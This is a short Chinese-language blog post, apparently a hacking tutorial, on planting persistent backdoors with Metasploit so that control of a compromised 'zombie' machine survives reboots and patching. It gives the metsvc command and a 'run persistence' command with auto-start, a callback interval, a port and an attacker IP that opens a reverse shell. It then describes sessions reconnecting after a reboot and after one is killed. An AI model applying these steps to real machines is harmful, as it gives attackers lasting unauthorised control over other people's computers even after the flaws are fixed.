「黑客技術」Msf植入後門

2020-10-29
| 科技

為什麼要植入後門呢！？ 植入後門是為了以後能直接連接肉雞機器不要再花費時間

就算漏洞修復後 也一樣能 維持控制。Msf的shell是運行在內存裡面 如果主機重啟了 那麼shell就失效了。

Metsvc 植入後門

run metsvc -A

執行成功 可以看到靶機上面已經上傳了3個文件

Msf 裡面查看後臺任務

可以看到已經有個直連的監聽程序已經在運行了

重啟靶機

這裡沒有連接上可能是 windows自帶殺軟 或是uac 防火牆導致的

這個後門不能設置密碼而且只能固定的端口 很容易被發現

使用persistence模塊進行後門植入

這個和上面那個的不同點是這個是啟動項植入 而且可以設置回連時間和端口

run persistence -h


-A 自動打開監聽程序

-u 當用戶登錄自動進行回連

-X 當系統開機自動運行後門

-I 隔多少秒進行一次回連

-p 指定端口

-r 要反彈的連接的主機

run persistence -X -A -i 20 -p 6666 -r 192.168.10.8

然後background 後臺運行 查看目前在運行的任務

可以看到自動生成了有個監聽

過了會 反彈回來了有個shell


把sessions 6給kill掉 看看他過會還會不會反彈多個shell回來


隔了一會反彈了個session回來
